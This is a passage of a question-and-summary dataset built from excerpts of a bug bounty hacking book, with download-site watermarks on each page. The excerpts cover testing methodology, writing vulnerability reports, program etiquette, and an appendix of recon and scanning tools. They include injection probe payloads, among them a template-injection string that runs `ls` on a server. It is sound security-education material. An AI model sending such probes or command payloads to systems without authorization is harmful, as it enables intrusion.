outdo either resource. I don’t follow\nthis path because it’s too monotonous and reminiscent of employment\nrather than a pleasurable hobby. Nonetheless, following a checklist\ncan help you avoid missing vulnerabilities by forgetting to test\nspecific things or forgetting to follow general methodologies (like\nreviewing JavaScript files).\n337\nDownload from www.finelybook.com 7450911@qq.com\nFinding Vulnerabilities\nOnce you have an understanding of how an application works, you\ncan start testing. Rather than setting a specific goal or using a\nchecklist, I suggest beginning by looking for behavior that could\nindicate a vulnerability. At this stage, you might assume you should\nrun automated scanners, like Burp’s scanning engine to look for\nvulnerabilities. But most programs I’ve looked at don’t permit this,\nit’s unnecessarily noisy, and it requires no skill or knowledge. Instead,\nyou should focus on manual testing.\nIf I’ve begun my application testing without finding anything\nexciting to look at during my functionality mapping, I start using the\nsite as if I were a customer. I’ll create content, users, teams, or\nwhatever the application provides. While doing this, I usually submit\npayloads wherever input is accepted and look for anomalies and\nunexpected behavior from the site. I typically use the payload\n<s>000'\")};--//, which includes all the special characters that could break\nthe context the payload is rendered in, whether that’s HTML,\nJavaScript, or a backend SQL query. This type of payload is often\nreferred to as a polyglot. The <s> tag is also innocent, easy to spot\nwhen rendered unsanitized in HTML (you would see strikethrough\ntext when that happens), and frequently left unmodified when a site\nattempts to sanitize output by altering input.\nAdditionally, when there’s a chance the content I’m creating could\nbe rendered on an administration panel, like my username, address,\nand so forth, I’ll use a different payload to target blind XSS from\nXSSHunter (an XSS tool discussed in Appendix A). Finally, if the site\nuses a templating engine, I’ll also add payloads associated with the\ntemplate. For AngularJS, this would look like {{8*8}}[[5*5]], and I\nwould look for 64 or 25 rendered. Although I’ve never found a server-\n338\nDownload from www.finelybook.com 7450911@qq.com\nside template injection in Rails, I still try the payload <%= `ls` %> in\ncase an inline render shows up one day.\nAlthough submitting these types of payloads covers injection type\nvulnerabilities (such as XSS, SQLi, SSTI, and so on), it also doesn’t\nrequire much critical thinking and can quickly become repetitive and\nboring. So, to avoid burn out, it’s important to keep an eye on your\nproxy history for unusual functionality commonly associated with\nvulnerabilities. Common vulnerabilities and areas to keep an eye out\nfor include, but are not limited to, the following:\nCSRF vulnerabilities The types of HTTP requests that change\ndata and whether they’re using and validating CSRF tokens or\nchecking the referrer or origin headers\nIDORs Whether there are any ID parameters that can be\nmanipulated\nApplication logic Opportunities to repeat requests across two\nseparate user accounts\nXXEs Any XML-accepting HTTP requests\nInformation disclosures Any content that is guaranteed to be, or\nshould be, kept private\nOpen redirects Any URLs that have a redirect-related parameter\nCRLFs, XSS, and some open redirects Any requests that echo\nURL parameters in the response\nSQLi Whether adding a single quote, bracket, or semicolon to a\nparameter changes a response\nRCEs Any type of file upload or image manipulation\nRace conditions Delayed data processing or behaviors related to\nthe time of use or time of check\n339\nDownload from www.finelybook.com 7450911@qq.com\nSSRFs Functionality that accepts URLs, such as webhooks or\nexternal integrations\nUnpatched security bugs Disclosed server information, such as\nversions of PHP, Apache, Nginx, and so on, that can reveal\noutdated technology\nOf course, this list is endless and arguably always evolving. When\nyou need more inspiration for where to hunt for bugs, you can always\nlook at the takeaway sections in each chapter of this book. After\nyou’ve dug into the functionality and need a break from HTTP\nrequests, you can flip back to your file and directory brute-forcing to\nsee what, if any, interesting files or directories have been discovered.\nYou should review those findings and visit the pages and files. This is\nalso the perfect time to reassess what you’re brute-forcing and\ndetermine whether there are other areas to focus on. For example, if\nyou discovered an /api/ endpoint, you could brute-force new paths on\nthat, which can sometimes lead to hidden, undocumented functionality\nto test. Similarly, if you used Burp Suite to proxy your HTTP traffic,\nBurp might have picked up additional pages to check based on the\nlinks it parsed from the pages you’d already visited. These unvisited\npages, which might lead you to untested functionality, are gray in\nBurp Suite to differentiate them from already-visited links.\nAs previously mentioned, hacking web applications isn’t magic.\nBeing a bug hunter requires one-third knowledge, one-third\nobservation, and one-third perseverance. Digging deeper into the\napplication and thoroughly testing without wasting your time is key.\nUnfortunately, recognizing the difference takes experience.\nGOING FURTHER\n340\nDownload from www.finelybook.com 7450911@qq.com\nOnce you’ve completed your recon and have thoroughly tested all the\nfunctionality you can find, you should research other ways to make\nyour bug search more efficient. Although I can’t tell you how to do\nthat in all situations, I do have some suggestions.\nAutomating Your Work\nOne way to save time is by automating your work. Although we’ve\nused some automated tools in this chapter, most of the techniques\ndescribed have been manual, which means we’re limited by time. To\nmove beyond the time barrier, you need computers to hack for you.\nRojan Rijal disclosed a Shopify bug he discovered five minutes after\nthe subdomain he found the bug on went live. He was able to discover\nit so quickly because he automated his recon on Shopify. How to\nautomate your hacking is beyond the scope of this book—and it’s also\nentirely possible to be a successful bug bounty hacker without it—but\nit’s one way hackers increase their income. You can begin by\nautomating your reconnaissance. For example, you can automate\nseveral tasks, such as subdomain brute-forcing, port scanning, and\nvisual recon, to name a few.\nLooking at Mobile Apps\nAnother opportunity to find more bugs is by looking at any mobile\napplications that are included in the program’s scope. This book has\nfocused on web hacking, but mobile hacking offers plenty of new\nopportunities to find bugs. You can hack mobile apps in one of two\nways: testing the application code directly or testing the APIs the app\ninteracts with. I focus on the latter because it’s similar to web hacking\nand I can concentrate on vulnerability types like IDOR, SQLi, RCE,\nand so on. To start testing mobile app APIs, you’ll need to proxy your\n341\nDownload from www.finelybook.com 7450911@qq.com\nphone traffic as you’re using the app through Burp. This is one way to\nsee the HTTP calls being made so you can manipulate them. But\nsometimes an app uses SSL pinning, meaning it won’t recognize or\nuse the Burp SSL certificate, so you can’t proxy the app’s traffic.\nBypassing SSL pinning, proxying your phone, and general mobile\nhacking is beyond the scope of this book, but they do represent a great\nopportunity for new learning.\nIdentifying New Fuctionality\nThe next area to focus on is identifying new functionality as it’s added\nto the application you’re testing. Philippe Harewood is an amazing\nexample of someone who has mastered this skill. Among the top-\nranked hackers in the Facebook program, he openly shares the\nvulnerabilities he discovers on his website at\nhttps://philippeharewood.com/. His write-ups routinely reference new\nfunctionality he’s discovered and the vulnerabilities he’s found before\nothers can because of his quick identification. Frans Rosen shares\nsome of his methodology for identifying new functionality on the\nDetectify blog at https://blog.detectify.com/. To track new\nfunctionality on the websites you’re testing, you can read the\nengineering blogs of the sites you test, monitor their engineering\nTwitter feeds, sign up for their newsletters, and so on.\nTracking JavaScript Files\nYou can also discover new site functionality by tracking JavaScript\nfiles. Focusing on JavaScript files is particularly powerful when a site\nrelies on frontend JavaScript frameworks to render its content. The\napplication will rely on having most of the HTTP endpoints a site uses\nincluded in its JavaScript files. Changes in the files might represent\n342\nDownload from www.finelybook.com 7450911@qq.com\nnew or changed functionality you can test. Jobert Abma, Brett\nBuerhaus, and Ben Sadeghipour have discussed approaches on how\nthey have tracked JavaScript files; you can find their write-ups with a\nquick Google search of their names and the word “reconnaissance.”\nPaying for Access to New Functionality\nAlthough it might seem counterintuitive when you’re trying to earn\nmoney through bounties, you can also pay for access to functionality.\nFrans Rosen and Ron Chan have discussed the success they’ve\nenjoyed by paying for access to new functionality. For example, Ron\nChan paid a couple of thousand dollars to test an application and\nfound a significant number of vulnerabilities that made the investment\nvery worthwhile. I’ve also been successful paying for products,\nsubscriptions, and services that increase my potential testing scope.\nOthers aren’t likely to want to pay for functionality on sites they don’t\nuse, so this functionality has more undiscovered vulnerabilities.\nLearning the Technology\nAdditionally, you can look into the technologies, libraries, and\nsoftware that you know a company is using and learn how they work\nin detail. The more you know how a technology works, the more\nlikely you are to find bugs based on how it’s being used in the\napplications you test. For example, finding the ImageMagick\nvulnerabilities in Chapter 12 required an understanding of how\nImageMagick and its defined file types work. You might be able to\nfind additional vulnerabilities by looking at other technology linked to\nlibraries like ImageMagick. Tavis Ormandy did this when he\ndisclosed additional vulnerabilities in Ghostscript, which\nImageMagick supports. You can find more information about these\n343\nDownload from www.finelybook.com 7450911@qq.com\nGhostscript vulnerabilities at https://www.openwall.com/lists/oss-\nsecurity/2018/08/21/2. Similarly, FileDescriptor revealed in a blog\npost that he reads RFCs on web functionality and focuses on security\nconsiderations to understand how something is supposed to work\nversus how it’s actually implemented. His intimate knowledge of\nOAuth is a great example of deep diving into a technology that\nnumerous websites use.\nSUMMARY\nIn this chapter, I’ve tried to shed some light on possible approaches to\nhacking based on my own experience and interviews with top bug\nbounty hackers. To date, I’ve had the most success after exploring a\ntarget, understanding the functionality it provides, and mapping that\nfunctionality to vulnerability types for testing. But areas that I\ncontinue to explore, and encourage you to look into as well, are\nautomation and documenting your methodology.\nLots of hacking tools are available that can make your life easier:\nBurp, ZAP, Nmap, and Gowitness are some of the few I’ve\nmentioned. To make better use of your time, keep these tools in mind\nas you hack.\nOnce you’ve exhausted the typical avenues you’d use to find bugs,\nlook for ways to make your bug searches more successful by digging\ndeeper into mobile applications and new functionality developed on\nthe websites you’re testing.\n344"
  },
  {
    "input": "What should you do before submitting a vulnerability report to a bug bounty platform?",
    "summary": "You've found a vulnerability—congratulations! To avoid rejection, always read a company's bug bounty policy to ensure the issue is valid and within their scope. Include detailed information like the URL, steps to reproduce, impact, and a fix when submitting your report. Reconfirm the vulnerability before submitting to prevent mistakes, as demonstrated by Mathias Karlsson's experience where he didn't receive a payout until he verified his findings.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n20\nVULNERABILITY REPORTS\nSo, you’ve found your first vulnerability. Congratulations! Finding\nvulnerabilities can be hard. My first piece of advice is to relax and not\nget ahead of yourself. When you rush, you’ll often make mistakes.\nBelieve me—I know how it feels to get excited and submit a bug only\nto have your report rejected. To rub salt in the wound, when a\ncompany closes the report as invalid, the bug bounty platform reduces\nyour reputation points. This chapter should help you avoid that\nsituation by giving you tips for writing a good bug report.\nREAD THE POLICY\nBefore you submit a vulnerability, make sure to review the program\npolicy. Each company that participates in a bug bounty platform\nprovides a policy document, which usually lists excluded vulnerability\ntypes and whether properties are in or out of the scope of the program.\nAlways read a company’s policies before hacking to avoid wasting\nyour time. If you haven’t read a program’s policy yet, do it now to\nmake sure you aren’t looking for known issues or bugs the company\n345\nDownload from www.finelybook.com 7450911@qq.com\nasks you not to report.\nHere’s a painful mistake I once made that I could have avoided by\nreading the policies. The first vulnerability I found was on Shopify. I\nrealized that if you submitted malformed HTML in its text editor,\nShopify’s parser would correct it and store the XSS. I was excited. I\nthought my bug hunting was paying off, and I couldn’t submit my\nreport fast enough.\nAfter submitting my report, I waited for the minimum bounty of\n$500. Within five minutes of submission, the program politely told me\nthe vulnerability was already known and that researchers had been\nasked not to submit it. The ticket was closed as an invalid report, and I\nlost five reputation points. I wanted to crawl into a hole. It was a tough\nlesson.\nLearn from my mistakes; read the policies.\nINCLUDE DETAILS; THEN INCLUDE\nMORE\nAfter you’ve confirmed you can report your vulnerability, you’ll need\nto write the report. If you want the company to take your report\nseriously, provide details that include the following:\nThe URL and any affected parameters needed to replicate the\nvulnerability\nYour browser, your operating system (if applicable), and the version of\nthe tested app (if applicable)\nA description of the vulnerability\nSteps to reproduce the vulnerability\nAn explanation of impact, including how the bug could be exploited\nA recommended fix to remediate the vulnerability\n346\nDownload from www.finelybook.com 7450911@qq.com\nI recommend you include proof of the vulnerability in the form of\nscreenshots or a short video, no longer than two minutes. Proof-of-\nconcept materials not only provide a record of your findings but also\nare helpful when demonstrating how to replicate a bug.\nWhen you’re preparing your report, you also need to consider the\nimplications of the bug. For example, a stored XSS on Twitter is a\nserious issue given that the company is public, the number of users,\nthe trust people have in the platform, and so on. Comparatively, a site\nwithout user accounts might deem a stored XSS to be less severe. In\ncontrast, a privacy leak on a sensitive website that hosts personal\nhealth records might be of greater importance than on Twitter, where\nmost user information is already public.\nRECONFIRM THE VULNERABILITY\nAfter you’ve read the company policies, drafted your report, and\nincluded proof-of-concept materials, take a minute to question\nwhether what you’re reporting is actually a vulnerability. For\nexample, if you’re reporting a CSRF vulnerability because you didn’t\nsee a token in the HTTP request body, check whether the parameter\nmight have been passed as a header instead.\nIn March 2016, Mathias Karlsson wrote a great blog post about\nfinding a Same Origin Policy (SOP) bypass\n(https://labs.detectify.com/2016/03/17/bypassing-sop-and-shouting-\nhello-before-you-cross-the-pond/). But he didn’t receive a payout,\nKarlsson explained in his blog post, using the Swedish saying Don’t\nshout hello before you cross the pond, which means don’t celebrate\nuntil you’re absolutely certain of success.\nAccording to Karlsson, he was testing Firefox and noticed the\n347"
  },
  {
    "input": "What are the key considerations for maintaining a good reputation and effective communication when participating in bug bounty programs?",
    "summary": "Mathias Karlsson discovered a vulnerability in Firefox where malformed hostnames could be exploited, but later realized he hadn't updated his operating system, causing the bug to disappear. He emphasizes the importance of verifying bugs before reporting and maintaining a good reputation across bug bounty platforms. Additionally, he highlights the need to respect companies' policies and communication when submitting reports, as this helps ensure effective collaboration and improves the overall bug bounty process.",
    "output": "Download from www.finelybook.com 7450911@qq.com\nbrowser would accept malformed hostnames on macOS. Specifically,\nthe URL http://example.com.. would load example.com but send\nexample.com.. in the host header. He then tried accessing\nhttp://example.com...evil.com and got the same result. He knew this\nmeant he could bypass the SOP because Flash would treat\nhttp://example.com..evil.com as being under the \\*.evil.com domain.\nHe checked the Alexa top 10,000 websites and found that 7 percent of\nsites would be exploitable, including yahoo.com.\nHe wrote up the vulnerability but then decided to double-check the\nissue with a coworker. They used another computer and reproduced\nthe vulnerability. He updated Firefox and still confirmed the\nvulnerability. He tweeted a teaser about the bug. Then he realized his\nmistake. He hadn’t updated his operating system. After doing so, the\nbug was gone. Apparently, the issue he noticed had been reported and\nfixed six months earlier.\nKarlsson is among the best bug bounty hackers, but even he almost\nmade an embarrassing mistake. Make sure you confirm your bugs\nbefore reporting them. It is a big letdown to think you’ve found a\nsignificant bug only to realize you’ve misunderstood the application\nand submitted an invalid report.\nYOUR REPUTATION\nWhenever you think of submitting a bug, step back and ask yourself\nwhether you would be proud to publicly disclose the report.\nWhen I began hacking, I submitted lots of reports because I wanted\nto be helpful and make it on to the leaderboard. But I was actually just\nwasting everyone’s time by writing invalid reports. Don’t make the\nsame mistake.\n348\nDownload from www.finelybook.com 7450911@qq.com\nYou might not care about your reputation, or you might believe\ncompanies can sort through incoming reports to find the meaningful\nbugs. But on all bug bounty platforms, your statistics matter. They’re\ntracked, and companies use them to determine whether to invite you to\nprivate programs. Such programs are typically more lucrative for\nhackers because fewer hackers are involved, meaning less\ncompetition.\nHere’s an example from my experience: I was invited to a private\nprogram and found eight vulnerabilities in a single day. But that night\nI submitted a report to another program and was given an N/A. The\nreport reduced my stats on HackerOne. So when I went to report\nanother bug to a private program the next day, I was informed that my\nstats were too low and I’d have to wait 30 days to report the bug I\nfound. Waiting those 30 days wasn’t fun. I got lucky—no one else\nfound the bug. But the consequences of my mistake taught me to\nvalue my reputation across all platforms.\nSHOW RESPECT FOR THE COMPANY\nAlthough it’s easy to forget, not all companies have the resources to\nimmediately respond to reports or integrate bug fixes. Keep the\ncompany’s viewpoint in mind as you write your reports or follow up.\nWhen a company launches a new public bug bounty program, it\nwill be inundated with reports it needs to triage. Give the company\nsome time to get back to you before you start asking for updates.\nSome company policies include a service-level agreement and\ncommitment to respond to reports within a given timeline. Curb your\nexcitement and consider the company’s workload. For new reports,\nexpect a response within five business days. After that, you can\n349\nDownload from www.finelybook.com 7450911@qq.com\nusually post a polite comment to confirm the status of the report. Most\ntimes, companies will respond and let you know the situation. If they\ndon’t, you should still give them a few more days before trying again\nor escalating the issue to the platform.\nOn the other hand, if the company has confirmed the vulnerability\ntriaged in the report, you can ask what the expected timeline is for the\nfix and whether you’ll be kept updated. You can also ask if you can\ncheck back in a month or two. Open communication is an indicator of\nprograms you want to continue working with; if a company is\nunresponsive, it’s best to move on to another program.\nWhile writing this book, I was lucky enough to chat with Adam\nBacchus while he held the title of Chief Bounty Officer at HackerOne\n(he has since moved back to Google as part of their Google Play\nrewards program, as of April 2019). Bacchus’s previous experience\nincludes time at Snapchat, where he worked to bridge the relationship\nbetween security and software engineering. He also worked on\nGoogle’s Vulnerability Management Team to help run the Google\nVulnerability Reward Program.\nBacchus helped me understand the problems triagers experience\nwhile operating a bounty program:\nAlthough bug bounty programs are continually improving, they receive\nmany invalid reports, particularly when they’re public programs. This is\nreferred to as noise. Report noise adds unnecessary work to program\ntriagers, which might delay their responses to valid reports.\nBounty programs have to find some way of balancing bug remediation\nwith preexisting development obligations. It’s tough when programs\nreceive a large volume of reports or reports from multiple people about\nthe same bugs. Prioritizing fixes is a particular challenge for low- or\nmedium-severity bugs.\nValidating reports in complicated systems takes time. For this reason,\n350\nDownload from www.finelybook.com 7450911@qq.com\nwriting clear descriptions and reproduction steps is important. When a\ntriager has to request additional information from you to validate and\nreproduce a bug, that delays the bug fix and your payout.\nNot all companies have the dedicated security personnel to run a full-time\nbounty program. Small companies might have employees split their time\nbetween administering the program and other development\nresponsibilities. As a result, it might take some companies longer to\nrespond to reports and track bug fixes.\nFixing bugs takes time, especially if the company goes through a full\ndevelopment life cycle. To integrate a fix, the company might need to go\nthrough certain steps, such as debugging, writing tests, and staging\ndeployments. These processes slow down fixes even more when low-\nimpact bugs are found in systems that customers rely on. Programs might\ntake longer than you expect to determine the right fix. But this is where\nclear lines of communication and respect for one another are important. If\nyou’re worried about getting paid quickly, focus on programs that pay on\ntriage.\nBug bounty programs want hackers to return. That’s because, as\nHackerOne has described, the severity of the bugs that a hacker reports\ntypically increases as that hacker submits more bugs to a single program.\nThis is referred to as going deep on a program.\nBad press is real. Programs always run the risk of mistakenly dismissing a\nvulnerability, taking too long on a fix, or awarding a bounty a hacker\nbelieves is too low. In addition, some hackers will call out programs in\nsocial and traditional media when they feel any of these situations has\noccurred. These risks affect how triagers do their jobs and the\nrelationships they develop with hackers.\nBacchus shared these insights to humanize the bug bounty process.\nI’ve had all kinds of experiences with programs, just as he’s\ndescribed. As you’re writing reports, keep in mind that hackers and\nprograms need to work together with a common understanding of\nthese challenges to improve the situation on both sides.\n351\nDownload from www.finelybook.com 7450911@qq.com\nAPPEALING BOUNTY REWARDS\nIf you submit a vulnerability to a company that pays a bounty, respect\nits decision about the payout amount, but don’t be afraid to talk to the\ncompany. On Quora, Jobert Abma, co-founder of HackerOne, shared\nthe following regarding bounty disagreements\n(https://www.quora.com/How-do-I-become-a-successful-Bug-bounty-\nhunter/):\nIf you disagree on a received amount, have a discussion why\nyou believe it deserves a higher reward. Avoid situations\nwhere you ask for another reward without elaborating why\nyou believe that. In return, a company should respect your\ntime and value.\nIt’s okay to politely ask why a report was awarded a specific\namount. When I’ve done this in the past, I usually use the following\ncomments:\nThanks very much for the bounty. I really appreciate it. I\nwas curious how the amount was determined. I was\nexpecting $X, but you awarded $Y. I thought this bug could\nbe used to [exploit Z], which could have a significant impact\non your [system/users]. I was hoping you could help me\nunderstand so I can better focus my time on what matters\nmost to you in the future.\nIn response, companies have done the following:\nExplained that the impact of a report was lower than I thought, without\nchanging the amount\nAgreed that they misinterpreted my report and increased the amount\n352\nDownload from www.finelybook.com 7450911@qq.com\nAgreed that they had misclassified my report and increased the amount\nafter the correction\nIf a company has disclosed a report involving the same type of\nvulnerability or a similar impact consistent with your bounty\nexpectation, you can also include a reference to that report in your\nfollow-up to explain your expectation. But I recommend you only\nreference reports from the same company. Don’t reference larger\npayouts from different companies because a bounty from company A\ndoesn’t necessarily justify the same bounty from company B.\nSUMMARY\nKnowing how to write a great report and communicate your findings\nis an important skill for successful bug bounty hackers. Reading\nprogram policies is essential, as is determining what details to include\nin your reports. Once you’ve found a bug, it’s vital to reconfirm your\nfindings to avoid submitting invalid reports. Even great hackers like\nMathias Karlsson consciously work to avoid making mistakes.\nOnce you’ve submitted your report, empathize with the people\ntriaging potential vulnerabilities. Keep Adam Bacchus’s insights in\nmind as you work with companies. If you’ve been paid a bounty and\ndon’t feel like it was appropriate, it’s best to have a polite\nconversation instead of venting on Twitter.\nAll of the reports you write affect your reputation on bug bounty\nplatforms. It’s important to be protective of that reputation because\nplatforms use your statistics to determine whether to invite you to\nprivate programs, where you may be able to earn greater return on\nyour hacking investment.\n353"
  },
  {
    "input": "What are some commonly used tools for web traffic analysis, subdomain enumeration, and website discovery in the context of security testing?",
    "summary": "This appendix lists commonly used hacking tools, including Burp Suite, Charles, Fiddler, Wireshark, and ZAP Proxy, which help with web traffic analysis and security testing. It also covers subdomain enumeration tools like Amass, crt.sh, Knockpy, and SubFinder, which are useful for identifying hidden parts of a website. Additionally, it mentions discovery tools such as Gobuster, SecLists, and Wfuzz for finding files, directories, and vulnerabilities. Screenshot tools like EyeWitness and Gowitness are provided for visual inspection of websites, while port scanning is another important technique in the process.",
    "output": "Download from www.finelybook.com 7450911@qq.com\nA\nTOOLS\nThis appendix contains a laundry list of hacking tools. Some of these\ntools allow you to automate your recon process, and others help you\ndiscover applications to attack. This list is not meant to be exhaustive;\nit only reflects tools I commonly use or know that other hackers use\nregularly. Also keep in mind that none of these tools should replace\nobservation or intuitive thinking. Michiel Prins, co-founder of\nHackerOne, deserves credit for helping develop the initial version of\nthis list and providing advice on how to effectively use tools when I\nstarted hacking.\nWEB PROXIES\nWeb proxies capture your web traffic so you can analyze requests sent\nand responses received. Several of these tools are available free of\ncharge, although professional versions of such tools have additional\nfeatures.\nBurp Suite\n354\nDownload from www.finelybook.com 7450911@qq.com\nBurp Suite (https://portswigger.net/burp/) is an integrated\nplatform for security testing. The most helpful of the tools in the\nplatform, and the one I use 90 percent of the time, is Burp’s web\nproxy. Recall from the bug reports in the book that the proxy\nallows you to monitor your traffic, intercept requests in real time,\nmodify them, and then forward them. Burp has an extensive set of\ntools, but these are the ones I find most noteworthy:\nAn application-aware Spider for crawling content and functionality (either\npassively or actively)\nA web scanner for automating vulnerability detection\nA repeater for manipulating and resending individual requests\nExtensions to build additional functionality on the platform\nBurp is available for free with limited access to its tools, although\nyou can also buy a Pro version for an annual subscription. I\nrecommend starting with the free version until you understand\nhow to use it. When you’re steadily finding vulnerabilities, buy the\nPro edition to make your life easier.\nCharles\nCharles (https://www.charlesproxy.com/) is an HTTP proxy, an\nHTTP monitor, and a reverse proxy tool that enables a developer\nto view HTTP and SSL/HTTPS traffic. With it, you can view\nrequests, responses, and HTTP headers (which contain cookies\nand caching information).\nFiddler\nFiddler (https://www.telerik.com/fiddler/) is another lightweight\nproxy you can use to monitor your traffic, but the stable version is\n355\nDownload from www.finelybook.com 7450911@qq.com\nonly available for Windows. Mac and Linux versions are available\nin beta at the time of this writing.\nWireshark\nWireshark (https://www.wireshark.org/) is a network protocol\nanalyzer that lets you see what is happening on your network in\ndetail. Wireshark is most useful when you’re trying to monitor\ntraffic that can’t be proxied via Burp or ZAP. If you’re just\nstarting out, using Burp Suite might be best if the site is only\ncommunicating over HTTP/HTTPS.\nZAP Proxy\nThe OWASP Zed Attack Proxy (ZAP) is a free, community-based,\nopen source platform similar to Burp. It’s available at\nhttps://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Pr\noject. It also has a variety of tools, including a proxy, repeater,\nscanner, directory/file brute-forcer, and so on. In addition, it\nsupports add-ons so you can create additional functionality if\nyou’re so inclined. The website has some useful information to\nhelp you get started.\nSUBDOMAIN ENUMERATION\nWebsites often have subdomains that are hard to discover through\nmanual work. Brute-forcing subdomains can help you identify a\nprogram’s additional attack surface.\nAmass\nThe OWASP Amass tool (https://github.com/OWASP/Amass)\nobtains subdomain names by scraping data sources, using\n356\nDownload from www.finelybook.com 7450911@qq.com\nrecursive brute-forcing, crawling web archives, permuting or\naltering names, and using reverse DNS sweeping. Amass also uses\nthe IP addresses obtained during resolution to discover associated\nnetblocks and autonomous system numbers (ASNs). It then uses\nthat information to build maps of the target networks.\ncrt.sh\nThe crt.sh website (https://crt.sh/) allows you to browse certificate\ntransparency logs so you can find subdomains associated with\ncertificates. Certificate registration can reveal any other\nsubdomains a site is using. You can use the website directly or the\ntool SubFinder, which parses results from crt.sh.\nKnockpy\nKnockpy (https://github.com/guelfoweb/knock/) is a Python tool\ndesigned to iterate over a word list to identify a company’s\nsubdomains. Identifying subdomains gives you a larger testable\nsurface and increases the chances of finding a successful\nvulnerability.\nSubFinder\nSubFinder (https://github.com/subfinder/subfinder/) is a\nsubdomain discovery tool written in Go that discovers valid\nwebsite subdomains by using passive online sources. It has a\nsimple modular architecture and is meant to replace a similar tool,\nSublist3r. SubFinder uses passive sources, search engines,\npastebins, internet archives, and so on to find subdomains. When it\nfinds subdomains, it uses a permutation module inspired by the\ntool altdns to generate permutations and a powerful brute-forcing\nengine to resolve them. It can also perform plain brute-forcing if\n357\nDownload from www.finelybook.com 7450911@qq.com\nneeded. The tool is highly customizable, and the code is built\nusing a modular approach, making it easy to add functionality and\nremove errors.\nDISCOVERY\nWhen you’ve identified a program’s attack surface, the next step is to\nenumerate files and directories. Doing so can help you find hidden\nfunctionality, sensitive files, credentials, and so on.\nGobuster\nGobuster (https://github.com/OJ/gobuster/) is a tool you can use to\nbrute-force URIs (directories and files) and DNS subdomains\nusing wildcard support. It’s extremely fast, customizable, and easy\nto use.\nSecLists\nAlthough technically not a tool in and of itself, SecLists\n(https://github.com/danielmiessler/SecLists/) is a collection of\nword lists you can use while hacking. The lists include usernames,\npasswords, URLs, fuzzing strings, common\ndirectories/files/subdomains, and so on.\nWfuzz\nWfuzz (https://github.com/xmendez/wfuzz/) allows you to inject\nany input in any field of an HTTP request. Using Wfuzz, you can\nperform complex attacks on a web application’s different\ncomponents, such as its parameters, authentication, forms,\ndirectories or files, headers, and so on. You can also use Wfuzz as\na vulnerability scanner when supported with plug-ins.\n358\nDownload from www.finelybook.com 7450911@qq.com\nSCREENSHOTTING\nIn some cases, your attack surface will be too large for you to test\nevery aspect of it. When you need to check a long list of websites or\nsubdomains, you can use automatic screenshot tools. These tools\nallow you to visually inspect websites without visiting each one.\nEyeWitness\nEyeWitness (https://github.com/FortyNorthSecurity/EyeWitness/)\nis designed to take screenshots of websites, provide server header\ninformation, and identify default credentials when possible. It’s a\ngreat tool for detecting which services are running on common\nHTTP and HTTPS ports, and you can use it with other tools, like\nNmap, to quickly enumerate hacking targets.\nGowitness\nGowitness (https://github.com/sensepost/gowitness/) is a website\nscreenshot utility written in Go. It uses Chrome Headless to\ngenerate screenshots of web interfaces using the command line.\nThe project is inspired by the EyeWitness tool.\nHTTPScreenShot\nHTTPScreenShot\n(https://github.com/breenmachine/httpscreenshot/) is a tool for\ngrabbing screenshots and the HTML of large numbers of websites.\nHTTPScreenShot accepts IPs as a list of URLs to screenshot. It\ncan also brute-force subdomains, add them to the list of URLs to\nbe screenshotted, and cluster results for easier review.\nPORT SCANNING\n359"
  },
  {
    "input": "What are the key tools used for network discovery, reconnaissance, and vulnerability assessment in the context of hacking?",
    "summary": "Masscan and Nmap are two fast port scanning tools, with Masscan being the fastest and Nmap offering additional features like scripts for security auditing. Tools like BuiltWith, Censys, Google Dorks, and Shodan help in reconnaissance by identifying technologies, configurations, and vulnerabilities on websites. Additionally, hacking tools such as sqlmap, XSSHunter, and Ysoserial automate vulnerability detection and exploitation, while mobile analysis tools like dex2jar and Hopper assist in examining Android and iOS applications. Browser plugins like FoxyProxy and User Agent Switcher enhance web testing capabilities by managing proxies and spoofing user agents.",
    "output": "Download from www.finelybook.com 7450911@qq.com\nIn addition to finding URLs and subdomains, you’ll need to figure out\nwhat ports are available and what applications a server is running.\nMasscan\nMasscan (https://github.com/robertdavidgraham/masscan/) claims\nto be the world’s fastest internet port scanner. It can scan the entire\ninternet in less than six minutes, transmitting 10 million packets\nper second. It produces results similar to Nmap, only faster. In\naddition, Masscan allows you to scan arbitrary address ranges and\nport ranges.\nNmap\nNmap (https://nmap.org/) is a free and open source utility for\nnetwork discovery and security auditing. Nmap uses raw IP\npackets to determine:\nWhich hosts are available on a network\nWhich services (along with the application name and version) those hosts\nare offering\nWhich operating systems (and versions) they’re running\nWhat type of packet filters or firewalls are in use\nThe Nmap site has a robust list of installation instructions for\nWindows, Mac, and Linux. In addition to port scanning, Nmap\nalso includes scripts to build additional functionality. One script I\ncommonly use is http-enum to enumerate files and directories on\nservers after port scanning them.\nRECONNAISSANCE\n360\nDownload from www.finelybook.com 7450911@qq.com\nAfter you’ve found the URIs, subdomains, and ports of websites you\ncan test, you’ll need to learn more about the technologies they use and\nthe other parts of the internet they’re connected to. The following\ntools will help you do this.\nBuiltWith\nBuiltWith (http://builtwith.com/) helps you fingerprint different\ntechnologies used on a target. According to its site, it can check\nfor more than 18,000 types of internet technologies, including\nanalytics, hosting, the CMS type, and so on.\nCensys\nCensys (https://censys.io/) collects data on hosts and websites\nthrough daily ZMap and ZGrab scans of the IPv4 address space. It\nmaintains a database of how hosts and websites are configured.\nUnfortunately, Censys recently implemented a paid model, which\nis expensive to use for large-scale hacking, but the free tier can\nstill be helpful.\nGoogle Dorks\nGoogle Dorking (https://www.exploit-db.com/google-hacking-\ndatabase/) refers to using advanced syntaxes that Google provides\nto find information not readily available when navigating a\nwebsite manually. This information can include finding vulnerable\nfiles, opportunities for external resource loading, and other attack\nsurfaces.\nShodan\nShodan (https://www.shodan.io/) is a search engine for the internet\nof things. Shodan can help you discover which devices are\n361\nDownload from www.finelybook.com 7450911@qq.com\nconnected to the internet, where they’re located, and who is using\nthem. This is particularly helpful when you’re exploring a\npotential target and trying to learn as much about the target’s\ninfrastructure as you can.\nWhat CMS\nWhat CMS (http://www.whatcms.org/) allows you to enter a URL\nand returns the content management system (CMS) the site is most\nlikely using. Finding the type of CMS a site is using is helpful\nbecause:\nKnowing which CMS a site uses gives you insight into the site code’s\nstructure.\nIf the CMS is open source, you can browse the code for vulnerabilities\nand test them on the site.\nThe site might be outdated and vulnerable to disclosed security\nvulnerabilities.\nHACKING TOOLS\nUsing hacking tools, you can automate not only the discovery and\nenumeration process, but also the processes for finding vulnerabilities.\nBucket Finder\nBucket Finder (https://digi.ninja/files/bucket_finder_1.1.tar.bz2)\nsearches for readable buckets and lists all the files in them. It can\nalso quickly find buckets that exist but don’t allow you to list files.\nWhen you find these bucket types, you can try using the AWS 